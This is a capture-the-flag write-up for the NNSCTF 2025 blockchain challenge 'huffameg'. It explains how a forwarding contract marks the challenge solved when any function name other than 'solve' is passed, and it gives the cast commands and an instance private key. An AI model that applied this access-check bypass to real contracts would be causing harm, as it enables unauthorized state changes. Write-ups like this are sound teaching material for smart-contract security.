# NNSCTF 2025/blockchain-huffameg

Writeup for the Challenge "huffameg" blockchain category in NNSCTF 2025 playing with THEM?!

------------------------------------------------------------------------

**Category:** Blockchain

**Author:** hoover

**Descritopn:** I don't understand, this just needs to return true! Hey Alexa, play "Tante Sofies sinte vise" until we've solved this challenge...

**Flag Format:** NNS{*}

## Challenge

We are given a Foundry-based blockchain challenge with a Huff contract.  
The setup provides an account, private key, and RPC URL. The contract exposes `isSolved()` which must return true to solve the instance.

The instance gave me:

- Account Address: `0xBB01635e6dbE2773FD854f05e5A65c863cA6ab3C`
- Private Key: `0x397195da97b0945a968e850e9f0d6976831b9311cd08d06da51822d05bc533bc`
- Challenge Contract: `0xF9AE1e1541d934B7F9245d2DfE9264Cd6374e49c`
- Implementation Contract: `0xcCD49B6981caE303D111a68e9e433d1D2d5Af4c0`
- RPC URL: `https://df9b8c7a-88aa-4dea-a950-77156d0f1bcb.chall.nnsc.tf/rpc`

------------------------------------------------------------------------

## Step 1 --- First thoughts

The description hinted that the solution should be "just return true".  
So I started by checking the contracts and how `isSolved()` is updated.  
It turned out there is a forwarding contract (`Implementation`) that calls into the Huff challenge contract.  
This felt like the usual CTF trick: something that looks too simple probably has a small catch.

------------------------------------------------------------------------

## Step 2 --- Analysis

Looking at the Huff contract, the `SOLVE()` function checks two things:

- It can only be called by the Implementation contract (so I can’t call it directly).  
- It reverts if the provided input equals `SOLVE_SIG = keccak256("solve()")`.

Meanwhile, the Implementation contract exposes a helper:  
`callFunction(string)` which builds a selector and forwards a call into the challenge contract.  
It also updates its own `isSolved` state if the call returns successfully.

That means:

- If I pass `"solve"`, the Huff contract reverts, and nothing is updated.  
- But if I pass **any other valid function name** (like `"owner"`), then the call succeeds, and the Implementation sets `isSolved = true`.  

So the trick was basically to not overthink and just pick a different function name.

------------------------------------------------------------------------

## Step 3 --- Exploit script

Commands I ran with `cast` (Foundry):

```bash
# First, check current status (it was 0)
cast call 0xcCD49B6981caE303D111a68e9e433d1D2d5Af4c0 "isSolved()"   --rpc-url https://df9b8c7a-88aa-4dea-a950-77156d0f1bcb.chall.nnsc.tf/rpc

# Then, call through the Implementation with a safe function name
cast send 0xcCD49B6981caE303D111a68e9e433d1D2d5Af4c0   "callFunction(string)" "owner"   --rpc-url https://df9b8c7a-88aa-4dea-a950-77156d0f1bcb.chall.nnsc.tf/rpc   --private-key 0x397195da97b0945a968e850e9f0d6976831b9311cd08d06da51822d05bc533bc

# Finally, verify it worked (this time it returned 1)
cast call 0xcCD49B6981caE303D111a68e9e433d1D2d5Af4c0 "isSolved()"   --rpc-url https://df9b8c7a-88aa-4dea-a950-77156d0f1bcb.chall.nnsc.tf/rpc
```

------------------------------------------------------------------------

## Step 4 --- Result

After running the `cast send` with `"owner"`, the status flipped:  

```
0x...0001
```

Meaning `isSolved()` returned true.  
On the platform, the challenge switched to **Solved**, and the flag was displayed.  

------------------------------------------------------------------------

## Flag

    NNS{<I don’t remember the exact flag text anymore, and the instance is not working anymore>}

------------------------------------------------------------------------

## Notes

The trick was understanding how the forwarding worked.  
It felt like a typical CTF smart contract puzzle: misleading you into trying `"solve"`, while any other valid selector would pass.  

In the end it was just about using the provided RPC and private key with `cast`, like all those YouTube/CTF service-style instances.  
Pretty fun one, and it didn’t require any heavy scripting — just a couple of `cast` commands.  
